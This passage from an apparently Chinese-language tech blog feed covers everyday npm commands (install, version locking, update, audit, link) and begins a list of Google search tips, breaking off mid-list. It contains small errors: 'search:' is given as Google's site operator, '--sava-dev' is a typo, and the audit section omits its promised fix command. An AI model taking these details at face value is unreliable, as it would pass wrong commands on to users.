的默认配置：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm config set init.<span class="property">author</span>.<span class="property">name</span> <span class="variable constant_">YOUR_NAME</span></span><br><span class="line">npm config set init.<span class="property">author</span>.<span class="property">email</span> <span class="variable constant_">YOUR_EMAIL</span></span><br></pre></td></tr></table></figure><p><br />当执行以上命令之后，之后再执行 npm init 命令时，package.json 的作者姓名和邮箱都会初始化为我们设定的值。<br><a name="KHxSO"></a></p><h2 id="3-快速了解-package"><a href="#3-快速了解-package" class="headerlink" title="3. 快速了解 package"></a>3. 快速了解 package</h2><p>当要使用一个包时，如果想要了解它是如何使用的，可以使用以下命令来打开这个包的主页，它会自动启动浏览器并打开这个页面，这里以 React 为例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm home react</span><br></pre></td></tr></table></figure><p><br />如果想要查看这个包现存的 issue，或者公开的 roadmap，可以执行以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm bugs react</span><br></pre></td></tr></table></figure><p><br />如果想要查看这个包的代码地址，可以执行以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm repo react</span><br></pre></td></tr></table></figure><p><br />如果想要查看这个包的详细信息，可以执行以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm info react</span><br></pre></td></tr></table></figure><p><br />执行结果如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636565247588-6d132b59-0131-4a42-acb8-0e3f67f58363.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636565247588-6d132b59-0131-4a42-acb8-0e3f67f58363.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这里返回的是一个 JavaScript 对象，里面包含 react 模块的详细信息，可以通过 info 命令来获取这个对象的成员信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm info react description</span><br></pre></td></tr></table></figure><p><br />执行结果如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636565484926-0ced2347-9d30-44be-b9f9-894e76df52e6.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636565484926-0ced2347-9d30-44be-b9f9-894e76df52e6.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="c0jZ5"></a></p><h2 id="4-安装依赖"><a href="#4-安装依赖" class="headerlink" title="4. 安装依赖"></a>4. 安装依赖</h2><p>可以使用 npm install 命令来安装需要的包，如果想把这个包自动添加到 package.json 中，可以执行以下命令，这里以安装 React 为例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install react --save</span><br></pre></td></tr></table></figure><p><br />如果想要安装不同版本的包，可以这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 安装最新版本</span></span><br><span class="line">npm install react@latest</span><br><span class="line"><span class="comment">// 安装指定版本</span></span><br><span class="line">npm install react@<span class="number">16.8</span><span class="number">.0</span></span><br><span class="line"><span class="comment">// 安装指定区间版本</span></span><br><span class="line">npm install react@<span class="string">&quot;&gt;=16.8.0 &lt;17.0.1&quot;</span></span><br></pre></td></tr></table></figure><p><br />当使用 npm 安装依赖时，分为本地安装（local）和全局安装（global），它俩的区别就是是否包含-g 参数：</p><p>| <strong>命令</strong></p><p>| <strong>简写</strong></p><p>| <strong>说明</strong></p><p>| |<br>| |</p><p>| 无</p><p>| 无</p><p>| 将模块安装到本地 node_modules 目录下，但不保存在 package.json 中。</p><p>|<br>| –save</p><p>| -S</p><p>| 将模块安装到本地 node_modules 目录下，同时保存到 package.json 中的 dependencies 配置项中，在生产环境下这个包的依赖依然存在。</p><p>|<br>| –sava-dev</p><p>| -D</p><p>| 将模块安装到本地 node_modules 目录下，同时保存到 package.json 中的 devDependencies 配置项中，仅供开发时使用。</p><p>|<br>| –global</p><p>| -g</p><p>| 安装的模块为全局模块，如果命令行模块，会直接链接到环境变量中。</p><p>|</p><p>可以使用 require 关键字来引入本地安装的包。为了避免引用模块消失，保证依赖模块都会出现在 package.json 中，最好在 npm install 时加上–save。</p><p>需要注意，在执行 npm install 命令时，npm 5 之前只会下载，不会保存依赖信息。如果需要保存，就需要加上 –save 选项， npm 5 以后就可以省略 –save 选项了，它会自动保存。</p><p><a name="hJwWS"></a></p><h2 id="5-锁定依赖"><a href="#5-锁定依赖" class="headerlink" title="5. 锁定依赖"></a>5. 锁定依赖</h2><p>当使用–save 来安装依赖时，npm 会把这个依赖保存起来，并添加^前缀，他表示，当再次执行 npm install 命令时，会自动安装这个包在此大版本下的最新版本。如果想要修改这个功能，可以执行以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set save-prefix=<span class="string">&#x27;~&#x27;</span></span><br></pre></td></tr></table></figure><p><br />执行完该命令之后，就会把^符号改为~符号。当再次安装新模块时，就从只允许小版本的升级变成了只允许补丁包的升级。</p><p>如果想要锁定当前的版本，可以执行以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm config set save-exact <span class="literal">true</span></span><br></pre></td></tr></table></figure><p><br />这样每次 npm install xxx –save 时就会锁定依赖的版本号，相当于加了 –save-exact 参数。建议线上的应用都采用这种锁定版本号的方式。</p><p>为了彻底的锁定依赖的版本，让应用在任何机器上都安装同样的版本，可以执行以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm shrinkwrap</span><br></pre></td></tr></table></figure><p><br />执行这个命令之后，就会在项目的根目录产生一个 npm-shrinkwrap.json 配置文件，这里面包含了通过 node_modules 计算出的模块的依赖树及版本。只要目录下有 npm-shrinkwrap.json 则运行 npm install 时就会优先使用 npm-shrinkwrap.json 中的配置进行安装，没有则使用 package.json 进行安装。</p><p><a name="OyjZ3"></a></p><h2 id="6-搜索依赖"><a href="#6-搜索依赖" class="headerlink" title="6. 搜索依赖"></a>6. 搜索依赖</h2><p>npm 为我们提供了 search 命令，用于搜索 npm 仓库，它搜索的参数可以是一个字符串，也可以是一个正则表达式：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm search react</span><br></pre></td></tr></table></figure><p><br />搜索结果如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636566066645-98848595-5b53-4bbb-9d2c-f54a1cf1903e.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636566066645-98848595-5b53-4bbb-9d2c-f54a1cf1903e.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>当然，我们也可以去 node.js 官网去找：<a href="https://www.npmjs.com/">https://www.npmjs.com/</a></p><p>想要找到一个合适的依赖包可能并不是一件容易的事。这时，可以使用网站<a href="https://npms.io/">https://npms.io/</a>，这里将各个包的质量、受欢迎度、可维护性等指标做了量化。这些指标包括：是否使用了过时的依赖包、是否有代码检查配置、是否经过测试以及最近的版本是何时发布的等。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636566463569-7805283f-b440-4349-87e8-a05446107896.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636566463569-7805283f-b440-4349-87e8-a05446107896.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>不过，更直接方法可能就是去搜索引擎看别人的推荐了~<br><a name="orD0G"></a></p><h2 id="7-更新、卸载依赖"><a href="#7-更新、卸载依赖" class="headerlink" title="7. 更新、卸载依赖"></a>7. 更新、卸载依赖</h2><p>npm 为我们提供了更新依赖版本的命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm update [package name]</span><br></pre></td></tr></table></figure><p><br />如果想要更新全局安装的模块，需要添加参数 -global：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm update -<span class="variable language_">global</span> [package name]</span><br></pre></td></tr></table></figure><p><br />当执行这两个命令时，它会先到远程仓库查询最新版本，然后查询本地版本。如果本地版本不存在，或者远程版本较新，就会安装。</p><p>如果想要更新该依赖包在 package.json 中的版本，就需要使用-S 或者–save 参数。需要注意的是，从 npm v2.6.1 开始，npm update 只会更新顶层的模块，而不更新依赖的依赖模块，而之前的版本是递归更新的。如果想要这种效果，可以使用以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm --depth <span class="number">9999</span> update</span><br></pre></td></tr></table></figure><p><br />除了可以更新包之外，还可以删除指定的包：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall [package name]</span><br></pre></td></tr></table></figure><p><br />如果想要删除全局的包，需要添加参数 -global：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm uninstall [package name] -<span class="variable language_">global</span></span><br></pre></td></tr></table></figure><p><a name="EjgfI"></a></p><h2 id="8-查找过时的包"><a href="#8-查找过时的包" class="headerlink" title="8. 查找过时的包"></a>8. 查找过时的包<br /><br /></h2><p>npm 提供了一个命令来查看过时的依赖：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm outdated</span><br></pre></td></tr></table></figure><p><br />在我的项目中执行该命令，输出结果如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636568027665-1deebac9-d0f6-484a-9788-94d053a61747.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636568027665-1deebac9-d0f6-484a-9788-94d053a61747.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以看到，这里列出了过时依赖的包名称、当前的版本、希望的版本、最新的版本、依赖在本地路径、依赖这个包的项目名称。</p><p>可以通过以下命令来检查 npm 包的最新版本：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 展示包的信息</span></span><br><span class="line">npm view &lt;package-name&gt;</span><br><span class="line">npm v &lt;package-name&gt;</span><br><span class="line"><span class="comment">// 展示最新版本</span></span><br><span class="line">npm v &lt;package-name&gt; version</span><br><span class="line"><span class="comment">// 展示所有版本</span></span><br><span class="line">npm v &lt;package-name&gt; versions</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636640851742-5c850cb2-c268-48e4-b46b-eb2d6d130fd4.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636640851742-5c850cb2-c268-48e4-b46b-eb2d6d130fd4.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"><br><a name="R3r3e"></a></p><h2 id="9-执行脚本"><a href="#9-执行脚本" class="headerlink" title="9. 执行脚本"></a>9. 执行脚本<br /><br /></h2><p>npm 不仅可以用于管理模块，还可以用于执行脚本。在 package.json 文件中有一个 scripts 字段，可以用于定义脚本命令，功 npm 使用。我们除了可以在 package.json 文件中查看有哪些命令，也可以使用以下命令来查看所有脚本命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm run</span><br></pre></td></tr></table></figure><p><br />我的项目中执行该命令之后的结果如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636568912755-97c1950d-591f-4048-9649-8f023f8aaa1d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636568912755-97c1950d-591f-4048-9649-8f023f8aaa1d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以看到，这里定义了 dev、build、build:test 等命令，如果需要执行这些命令，只要这样执行即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm run dev</span><br><span class="line">npm run build</span><br></pre></td></tr></table></figure><p><br />这里不在多说，这或许是我们平时用的最多的命令了，可以根据实际开发情况，来定制自己的 npm 命令。</p><p><a name="ueCwC"></a></p><h2 id="10-安装可靠的依赖"><a href="#10-安装可靠的依赖" class="headerlink" title="10. 安装可靠的依赖"></a>10. 安装可靠的依赖<br /><br /></h2><p>可以使用 npm ci 命令来清理、安装依赖项。它通常用于 CI&#x2F;CD 等自动化环境，使用它可以获得可靠的依赖。<br />当执行该命令时，它会先删除本地的 node_modules 文件，因此它不需要去校验已下载文件版本与控制版本的关系，也不用校验是否存在最新版本的库，所以下载的速度相比 npm install 会更快。之后它会按照 package-lock.json 文件来安装确切版本的依赖项。并且不会将这个版本写入 package.json 或者 package-lock.json 文件。</p><p>使用该命令时，需要注意：<br />● 项目必需有 package-lock.json 或 npm-shrinkwrap.json 文件，如果没有，该命令将不起作用；<br />● npm ci 是 npm v6 中引入了的新命令，所以使用该命令时需要确保 npm 版本要&gt;&#x3D;5.7；<br />● npm ci 不能用来安装单个依赖，只能用来安装整个项目的依赖；<br />● npm ci 会安装 dependencies 和 devDependencies；<br />● 整个安装过程不会更新 package.json 或 package-lock.json 文件，整个安装过程是锁死的；<br />● 当 package-lock.json 中的依赖和 package.json 中不一致时，npm ci 会退出但不会修改 package-lock.json 文件。<br><a name="P2IFT"></a></p><h2 id="11-删除重复的包"><a href="#11-删除重复的包" class="headerlink" title="11. 删除重复的包"></a>11. 删除重复的包<br /><br /></h2><p>我们可以通过运行 npm dedupe 命令来删除重复的依赖项。该命令通过删除重复包并在多个依赖包之间共享公共依赖项来简化整体的结构。它会产生一个扁平的、去重的树。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm dedupe</span><br><span class="line">npm ddp</span><br></pre></td></tr></table></figure><p><a name="Fazhl"></a></p><h2 id="12-扫描漏洞"><a href="#12-扫描漏洞" class="headerlink" title="12. 扫描漏洞"></a>12. 扫描漏洞<br /><br /></h2><p>可以运行 npm audit 命令来扫描项目，来查找所有依赖项中存在的漏洞：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm audit</span><br></pre></td></tr></table></figure><p><br />来看我的项目扫描结果：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636639775777-55ac8b20-e6e3-4576-8faf-e071e23eb8d5.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636639775777-55ac8b20-e6e3-4576-8faf-e071e23eb8d5.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以运行以下命令来自动安装所有易受攻击包的补丁版本：</p><p><a name="cvmBa"></a></p><h2 id="13-列举已安装的包"><a href="#13-列举已安装的包" class="headerlink" title="13. 列举已安装的包"></a>13. 列举已安装的包<br /><br /></h2><p>可以通过以下命令来获取整个项目的包信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm list</span><br></pre></td></tr></table></figure><p><br />npm list 命令以树型结构列出当前项目安装的所有模块，以及它们依赖的模块。</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636640312723-e742df3e-29f3-4ee7-a8c2-d43ed829a080.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636640312723-e742df3e-29f3-4ee7-a8c2-d43ed829a080.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>如果加上 global 参数，就会列出全局安装的模块：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm list -<span class="variable language_">global</span></span><br></pre></td></tr></table></figure><p><br />也可以查看指定包的依赖，比如在我现在做的项目下，执行以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm list react</span><br></pre></td></tr></table></figure><p><br />还可以使用 npm ls 命令来查看指定包的依赖信息：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm ls react</span><br></pre></td></tr></table></figure><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636640355631-41d06b4e-c676-4e9a-a9f1-15eec5cd5853.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1636640355631-41d06b4e-c676-4e9a-a9f1-15eec5cd5853.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以使用–depth 参数来限制搜索的深度：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm ls --depth=<span class="number">1</span></span><br></pre></td></tr></table></figure><p><a name="cg0Q2"></a></p><h2 id="14-测试本地包"><a href="#14-测试本地包" class="headerlink" title="14. 测试本地包"></a>14. 测试本地包<br /><br /></h2><p>当我们在本地开发 npm 模块时，可以使用 npm link 命令来将本地的 npm 模块连接到对用的项目中去，便于对模块进行调试和测试。使用方式也很简单，在项目中执行以下命令：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm link</span><br></pre></td></tr></table></figure><p>执行完该命令之后，就会为这个 npm 包创建到全局，路径是 {prefix}&#x2F;lib&#x2F;node_modules&#x2F;<package>，它是一个快捷方式。之后我们就可以使用以下命令来在需要这个模块的项目中链接这个包：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm link 模块名</span><br></pre></td></tr></table></figure><p>这里的<strong>模块名</strong>就是依赖包的名称，也就是模块包的 package.json 文件中的 name 字段值。</p><p>如果不想继续使用了，执行以下命令来解除 link 即可：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm unlink 模块名</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 技巧 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 技巧 </tag>
            
            <tag> npm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google 搜索技巧</title>
      <link href="/2023/07/02/frontend/collection/skill/google-sou-suo-ji-qiao/"/>
      <url>/2023/07/02/frontend/collection/skill/google-sou-suo-ji-qiao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p>作为一个程序员，日常工作离不开搜索引擎。那如何使用搜索引擎进行高效、精准的搜索就是一门学问了，今天来看看一些使用谷歌搜索的技巧！</p><p><a name="dMDiL"></a></p><h2 id="1-使用引号精确搜索（“”）"><a href="#1-使用引号精确搜索（“”）" class="headerlink" title="1. 使用引号精确搜索（“”）"></a>1. 使用引号精确搜索（“”）<br /><br /></h2><p>当我们搜索特定内容时，可以是用双引号包裹索引内容，以减少 Google 搜搜的猜测。这时，Google 就会完全按照我们给出的搜索内容进行检索。检索结果中只显示包含确切内容的结果。</p><p>比如，搜索<strong>learn JavaScript array</strong>，那么搜索引擎就会按照任意顺序去搜索包含这三个词的内容：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640798155625-58466f0d-461c-448e-bf8c-7bed33186d27.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640798155625-58466f0d-461c-448e-bf8c-7bed33186d27.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>而如果使用引号包裹内容，搜索的就是精准内容：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640798087281-0a1400f4-98e8-4918-b0f4-7a896768385d.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640798087281-0a1400f4-98e8-4918-b0f4-7a896768385d.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="o8cwX"></a></p><h2 id="2-使用连字符排除内容（-）"><a href="#2-使用连字符排除内容（-）" class="headerlink" title="2. 使用连字符排除内容（-）"></a>2. 使用连字符排除内容（-）<br /><br /></h2><p>有时候，我们搜索的内容可能有多层含义，或者不想看到和某个信息相关的搜索，就可以使用连字符进行排除。</p><p>比如，搜索 JavaScript，排除维基百科中的相关内容：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640831849985-458de574-619c-4ec2-b501-c2e42124077b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640831849985-458de574-619c-4ec2-b501-c2e42124077b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="Au2fR"></a></p><h2 id="3-使用星号填充内容（-）"><a href="#3-使用星号填充内容（-）" class="headerlink" title="3. 使用星号填充内容（*）"></a>3. 使用星号填充内容（*）<br /><br /></h2><p>可以使用星号来填充文本之间的空格，比如在搜索时，只记得其中一部分内容，另一部分忘记了，就可以这样用。</p><p>例如，我们忘记了 Git 中撤销 commit 命令的第二个单词，可以这样搜索：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640799256370-069a163e-88c0-4db2-9ad3-424775fb2a8b.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640799256370-069a163e-88c0-4db2-9ad3-424775fb2a8b.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这里就是用星号通配符来代替不确定内容，以让谷歌完成搜索工作。</p><p><a name="jN2nX"></a></p><h2 id="4-搜索指定范围（…）"><a href="#4-搜索指定范围（…）" class="headerlink" title="4. 搜索指定范围（…）"></a>4. 搜索指定范围（…）<br /><br /></h2><p>可以使用…来搜索指定数字范围的内容，这些数字可以是年份、版本等。</p><p>比如，搜索：<strong>JavaScript in 2021….2022</strong><br /><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640832677076-9ff692d3-ed79-47cb-b530-0802824b3871.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640832677076-9ff692d3-ed79-47cb-b530-0802824b3871.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="BSi33"></a></p><h2 id="5-搜索指定站点内容（search-）"><a href="#5-搜索指定站点内容（search-）" class="headerlink" title="5. 搜索指定站点内容（search:）"></a>5. 搜索指定站点内容（search:）<br /><br /></h2><p>可以使用 **search：网站域名 搜索内容 **的形式来在指定网站内搜索内容。</p><p>比如，在 W3C 中搜索：<strong>search: w3schools.com javascript Array</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640833103521-32e2d1d1-0a66-4f7e-9a55-1049020d3219.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640833103521-32e2d1d1-0a66-4f7e-9a55-1049020d3219.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><a name="qYm6q"></a></p><h2 id="6-搜索指定文件类型内容（filetype）"><a href="#6-搜索指定文件类型内容（filetype）" class="headerlink" title="6. 搜索指定文件类型内容（filetype）"></a>6. 搜索指定文件类型内容（filetype）<br /><br /></h2><p>可以使用 filetype 来获取确定文件类型的搜索结果。可以使用这种方式来搜索电子书、文档等类型的内容。</p><p>比如，搜索：<strong>React ebook filetype:pdf</strong></p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640835788668-4e295fac-3227-4a24-80d1-422902094165.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1640835788668-4e295fac-3227-4a24-80d1-422902094165.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>可以看到，所有搜到的内容都是包含 PDF 的网页。</p><p><a name="rMaUE"></a></p><h2 id="7-查找多个关键字（AND）"><a href="#7-查找多个关键字（AND）" class="headerlink" title="7. 查找多个关键字（AND）"></a>7. 查找多个关键字（AND）<br /><br 